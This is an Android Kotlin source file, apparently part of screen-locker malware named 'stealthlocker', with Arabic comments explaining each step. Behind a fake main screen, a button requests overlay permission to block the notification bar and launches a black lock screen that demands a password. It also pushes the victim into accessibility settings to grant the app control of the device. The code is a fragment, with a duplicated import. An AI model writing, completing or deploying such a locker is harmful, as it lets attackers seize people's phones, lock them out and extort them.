package com.example.stealthlocker

import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_fake_main)

        val enableButton = findViewById<Button>(R.id.enableServiceBtn)

        // عند النقر، يفتح إعدادات إمكانية الوصول في الهاتف لكي تمنحه الصلاحية
        enableButton.setOnClickListener {
            // طلب إذن التراكب (Overlay) إن لزم لحجب شريط الإشعارات
            if (!Settings.canDrawOverlays(this)) {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
            }
            // عرض الشاشة السوداء وطلب كلمة المرور (كود جديد) قبل فتح الإذن
            startActivity(Intent(this, BlackScreenLockActivity::class.java))
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
        }
    }
}

